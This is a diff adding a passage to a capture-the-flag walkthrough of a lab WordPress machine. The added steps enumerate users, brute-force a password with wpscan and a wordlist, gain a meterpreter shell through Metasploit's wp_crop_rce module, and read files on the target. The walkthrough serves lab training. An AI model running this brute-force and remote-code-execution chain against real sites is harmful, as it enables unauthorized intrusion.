@@ -119,7 +119,55 @@ $ cat Alice-White-Rabbit.jpg.out
 You've found yourself in a rabbit hole, friend.
 ```
 
-Nothing useful.
+Nothing useful. Straight into the rabbit hole :/
+
+Back to our wordpress application, I started looking for common vulnerabilities of that specific version and also why `hydra` was giving wrong passwords as a match. Long story short, `hydra` is not always a good option (not in this case), and we shuldn't depend 100% on it. Additionaly, this wordpress version presents a path traversal vulnerability (CVE-2019-8943, CVE-2019-8942) that can be exploited using Metasploit once we have the credentials of a user of at least an author privilege.
+
+We have only two users in the blog. This can be verified by navigating to:
+```
+http://blog.thm/wp-json/wp/v2/users
+```
+
+Let's try and brute force login passwords of bjoel and kwheel but this time using `wpscan` (a wordpress security scanner). We are able to find the password of kwheel:
+```
+$ wpscan --url blog.thm -P /usr/share/wordlists/rockyou.txt -U "kwheel"
+
+<...snip...>
+[+] Performing password attack on Xmlrpc against 1 user/s
+Trying kwheel / morgan1 Time: 00:01:03 <                       > (2125 / 14344392)  0.01%  ETA: ??:??:??
+[SUCCESS] - kwheel / cutiepie1                                                                
+<...snip...>
+```
+
+Now we move to metasploit for further exploitation.
+```
+msf6 > use exploit/multi/http/wp_crop_rce
+
+msf6 exploit(multi/http/wp_crop_rce) > set username kwheel
+
+msf6 exploit(multi/http/wp_crop_rce) > set password cutipie1
+
+msf6 exploit(multi/http/wp_crop_rce) > set rhosts blog.thm
+
+msf6 exploit(multi/http/wp_crop_rce) > set lhost <your_ip>
+
+msf6 exploit(multi/http/wp_crop_rce) > exploit
+
+```
+
+Got access to the machine and now we gotta look for the files.
+First thing, we check the users on the machine. We find a `user.txt` file in bjoel home directory, but:
+```
+meterpreter > cat home/bjoel/user.txt
+
+You won't find what you're looking for here.
+TRY HARDER
+```
+
+For the user flag, I made use of the hint which is of the format `/*****/***`. There is one unique path of that format on the machine which is `/media/usb`. And this was the right answer.
+
+To Access the content of that folder, we need higher priviliges.
 
 TBC
+
 
